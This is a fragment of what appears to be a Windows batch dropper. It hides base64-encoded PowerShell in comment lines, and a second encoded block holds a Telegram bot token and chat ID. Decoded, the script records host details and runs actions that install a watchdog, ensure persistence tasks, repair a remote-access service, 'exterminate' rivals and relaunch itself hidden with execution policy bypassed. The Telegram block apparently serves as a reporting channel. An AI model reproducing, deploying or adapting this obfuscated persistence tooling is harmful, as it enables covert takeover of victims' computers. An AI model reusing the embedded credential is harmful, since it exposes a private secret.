::ID0gW29yZGVyZWRdQHsNCiAgICAgICAgaG9zdCAgICAgICAgID0gJGVudjpDT01Q
::VVRFUk5BTUUNCiAgICAgICAgdHMgICAgICAgICAgID0gKEdldC1EYXRlKS5Ub1Vu
::aXZlcnNhbFRpbWUoKS5Ub1N0cmluZygnbycpDQogICAgICAgIGJ1aWxkICAgICAg
::ICA9ICRCdWlsZA0KICAgICAgICBwcmltICAgICAgICAgPSAkKGlmICgkcHJpbSkg
::eyAkcHJpbSB9IGVsc2UgeyAnTUlTU0lORycgfSkNCiAgICAgICAgYWx0ICAgICAg
::ICAgID0gJChpZiAoJGFsdCkgeyAkYWx0IH0gZWxzZSB7ICdNSVNTSU5HJyB9KQ0K
::ICAgICAgICBncnl4YSAgICAgICAgPSAkKGlmICgkc2NyaXB0OmdyeXhhKSB7ICRz
::Y3JpcHQ6Z3J5eGEgfSBlbHNlIHsgJ01JU1NJTkcnIH0pDQogICAgICAgIGdyeXhh
::RnAgICAgICA9ICRncnl4YUZwDQogICAgICAgIGZvcmVpZ24gICAgICA9ICRmb3Jl
::aWduDQogICAgICAgIHRhc2tzT2sgICAgICA9ICR0YXNrc09rDQogICAgICAgIHRh
::c2tzVG90YWwgICA9ICR0YXNrc1RvdGFsDQogICAgICAgIHdhdGNoZG9nICAgICA9
::ICR3ZA0KICAgICAgICBpbnN0YWxsQ291bnQgPSAkaW5zdGFsbENvdW50DQogICAg
::ICAgIGxhc3RIZWFsICAgICA9ICQoaWYgKCRFeHRyYSkgeyAoR2V0LURhdGUpLlRv
::VW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCdvJykgfSBlbHNlaWYgKCRwcmV2Lmxh
::c3RIZWFsKSB7ICRwcmV2Lmxhc3RIZWFsIH0gZWxzZSB7ICRudWxsIH0pDQogICAg
::ICAgIG5vdGUgICAgICAgICA9ICRFeHRyYQ0KICAgIH0NCiAgICAoJHN0YXRlIHwg
::Q29udmVydFRvLUpzb24gLUNvbXByZXNzKSB8IFNldC1Db250ZW50IC1MaXRlcmFs
::UGF0aCAkc3RhdGVQYXRoIC1Gb3JjZQ0KICAgIHJldHVybiAkc3RhdGUNCn0NCg0K
::c3dpdGNoICgkQWN0aW9uKSB7DQogICAgJ2luaXQnICAgICAgICAgICAgeyAkaWQg
::PSBJbml0aWFsaXplLUlkZW50aXR5OyAkaWQuR2V0RW51bWVyYXRvcigpIHwgRm9y
::RWFjaC1PYmplY3QgeyAiJCgkXy5LZXkpPSQoJF8uVmFsdWUpIiB9IH0NCiAgICAn
::aWRlbnRpdHknICAgICAgICB7ICRpZCA9IFJlYWQtSWRlbnRpdHk7ICRpZC5HZXRF
::bnVtZXJhdG9yKCkgfCBGb3JFYWNoLU9iamVjdCB7ICIkKCRfLktleSk9JCgkXy5W
::YWx1ZSkiIH0gfQ0KICAgICd3YXRjaGRvZycgICAgICAgIHsgSW5zdGFsbC1XYXRj
::aGRvZyB8IE91dC1OdWxsIH0NCiAgICAnd2F0Y2hkb2ctZW5zdXJlJyB7IEVuc3Vy
::ZS1XYXRjaGRvZyB9DQogICAgJ3Rhc2tzLWVuc3VyZScgICAgeyBFbnN1cmUtUGVy
::c2lzdFRhc2tzIH0NCiAgICAnc3RhdGUnICAgICAgICAgICB7IFVwZGF0ZS1TdGF0
::ZSB8IENvbnZlcnRUby1Kc29uIC1Db21wcmVzcyB9DQogICAgJ3JlcGFpcicgICAg
::ICAgICAgeyBSZXBhaXItU0NTZXJ2aWNlICRGcCB9DQogICAgJ3JlZ2lzdGVyZWQn
::ICAgICAgeyBUZXN0LVNDUmVnaXN0ZXJlZCAkRnAgfQ0KICAgICdleHRlcm1pbmF0
::ZScgICAgIHsgSW52b2tlLUV4dGVybWluYXRlIH0NCiAgICAnZ3J5eGEtaGVhbHRo
::JyAgICB7IFRlc3QtR3J5eGFIZWFsdGggfQ0KICAgICdzeW5jLWdyeXhhLWZwJyAg
::IHsNCiAgICAgICAgJGcgPSBGaW5kLVJ1bm5pbmdHcnl4YUZwDQogICAgICAgIGlm
::ICgkZykgew0KICAgICAgICAgICAgU2V0LUdyeXhhRnAgJGcNCiAgICAgICAgICAg
::IFdyaXRlLU91dHB1dCAiU1lOQ0VEfCRnIg0KICAgICAgICB9IGVsc2Ugew0KICAg
::ICAgICAgICAgJGN1ciA9IEdldC1Hcnl4YUZwDQogICAgICAgICAgICBpZiAoLW5v
::dCAoVGVzdC1Jc0dyeXhhRnAgJGN1cikgLWFuZCAkc2NyaXB0OkdyeXhhRXhwZWN0
::ZWRGcCkgew0KICAgICAgICAgICAgICAgIFNldC1Hcnl4YUZwICRzY3JpcHQ6R3J5
::eGFFeHBlY3RlZEZwDQogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJSRVNF
::VHwkKCRzY3JpcHQ6R3J5eGFFeHBlY3RlZEZwKSINCiAgICAgICAgICAgIH0gZWxz
::ZSB7DQogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJOT05FfCRjdXIiDQog
::ICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQogICAgJ3Rlc3QtbXNpJyAg
::ICAgICAgew0KICAgICAgICAkcGF0aCA9ICRFeHRyYQ0KICAgICAgICBpZiAoLW5v
::dCAkcGF0aCkgeyBXcml0ZS1PdXRwdXQgJ25vJzsgYnJlYWsgfQ0KICAgICAgICBp
::ZiAoVGVzdC1Nc2lQYWNrYWdlICRwYXRoICRGcCkgeyBXcml0ZS1PdXRwdXQgJ3ll
::cycgfSBlbHNlIHsgV3JpdGUtT3V0cHV0ICdubycgfQ0KICAgIH0NCiAgICAncHJv
::dGVjdC1tc2knICAgICB7DQogICAgICAgICRzYWZlID0gUHJvdGVjdC1Nc2lTaWJs
::aW5nU2FmZSAkRXh0cmENCiAgICAgICAgaWYgKCRzYWZlKSB7IFdyaXRlLU91dHB1
::dCAkc2FmZSB9IGVsc2UgeyBXcml0ZS1PdXRwdXQgJ0ZBSUwnIH0NCiAgICB9DQog
::ICAgJ3ZlcmlmeS11cGRhdGUnICAgew0KICAgICAgICAjIEV4dHJhID0gIm1hbmlm
::ZXN0fHNpZ3xuYW1lPXBhdGg7bmFtZTI9cGF0aDIiDQogICAgICAgICRwYXJ0cyA9
::ICRFeHRyYSAtc3BsaXQgJ1x8JywgMw0KICAgICAgICBpZiAoJHBhcnRzLkNvdW50
::IC1sdCAzKSB7IFdyaXRlLU91dHB1dCAnYmFkLWFyZ3MnOyBicmVhayB9DQogICAg
::ICAgICRtYXAgPSBAe30NCiAgICAgICAgZm9yZWFjaCAoJHBhaXIgaW4gKCRwYXJ0
::c1syXSAtc3BsaXQgJzsnKSkgew0KICAgICAgICAgICAgaWYgKCRwYWlyIC1tYXRj
::aCAnXihbXj1dKyk9KC4qKSQnKSB7ICRtYXBbJG1hdGNoZXNbMV1dID0gJG1hdGNo
::ZXNbMl0gfQ0KICAgICAgICB9DQogICAgICAgIFdyaXRlLU91dHB1dCAoVGVzdC1V
::cGRhdGVNYW5pZmVzdCAkcGFydHNbMF0gJHBhcnRzWzFdICRtYXApDQogICAgfQ0K
::ICAgICdzeW5jLXNldnJ6LWZwJyAgIHsNCiAgICAgICAgaWYgKCRFeHRyYSkgeyBX
::cml0ZS1PdXRwdXQgKFN5bmMtU2V2cnpFeHBlY3RlZCAkRXh0cmEpIH0NCiAgICAg
::ICAgZWxzZSB7DQogICAgICAgICAgICAkayA9IEAoR2V0LVNldnJ6S2VlcCkNCiAg
::ICAgICAgICAgIFdyaXRlLU91dHB1dCAoIlNFVlJafCQoJGtbMF0pfCQoJGtbMV0p
::IikNCiAgICAgICAgfQ0KICAgIH0NCiAgICAnZ3J5eGEtZW5zdXJlJyAgICB7DQog
::ICAgICAgIGlmICgkTm9XYWl0KSB7DQogICAgICAgICAgICAjIEwzNS9MMzk6IHBh
::c3MgQXJndW1lbnRMaXN0IGFzIHN0cmluZyBhcnJheSAoam9pbmVkIHN0cmluZyBp
::cyBhIFN0YXJ0LVByb2Nlc3MgZm9vdGd1bikNCiAgICAgICAgICAgICRwcyA9IChH
::ZXQtUHJvY2VzcyAtSWQgJFBJRCkuUGF0aA0KICAgICAgICAgICAgaWYgKC1ub3Qg
::JHBzKSB7ICRwcyA9ICdwb3dlcnNoZWxsLmV4ZScgfQ0KICAgICAgICAgICAgJGFy
::Z0xpc3QgPSBAKA0KICAgICAgICAgICAgICAgICctTm9Qcm9maWxlJywgJy1FeGVj
::dXRpb25Qb2xpY3knLCAnQnlwYXNzJywNCiAgICAgICAgICAgICAgICAnLUZpbGUn
::LCAkUFNDb21tYW5kUGF0aCwNCiAgICAgICAgICAgICAgICAnLUFjdGlvbicsICdn
::cnl4YS1lbnN1cmUnLA0KICAgICAgICAgICAgICAgICctV29ya0RpcicsICRXb3Jr
::RGlyLA0KICAgICAgICAgICAgICAgICctQnVpbGQnLCAkQnVpbGQNCiAgICAgICAg
::ICAgICkNCiAgICAgICAgICAgIGlmICgkRGVlcCkgIHsgJGFyZ0xpc3QgKz0gJy1E
::ZWVwJyB9DQogICAgICAgICAgICBpZiAoJEZvcmNlKSB7ICRhcmdMaXN0ICs9ICct
::Rm9yY2UnIH0NCiAgICAgICAgICAgIFN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICRw
::cyAtQXJndW1lbnRMaXN0ICRhcmdMaXN0IC1XaW5kb3dTdHlsZSBIaWRkZW4NCiAg
::ICAgICAgICAgIFdyaXRlLU91dHB1dCAnUVVFVUVEfGRldGFjaGVkPTEnDQogICAg
::ICAgIH0gZWxzZSB7DQogICAgICAgICAgICBXcml0ZS1PdXRwdXQgKEludm9rZS1H
::cnl4YUVuc3VyZSB8IE91dC1TdHJpbmcpLlRyaW0oKQ0KICAgICAgICB9DQogICAg
::fQ0KfQ0K
::B64_LIB_END

::B64_NTF_BEGIN
Qk9UX1RPS0VOPTg2MTk3MTU3NTQ6QUFGTWsyTmpORC1oUWsyeFBGWWppY0hmQjVNeUt0Y1hDcWcK
Q0hBVF9JRD03NTQ3NDYyMDcwCg==
::B64_NTF_END
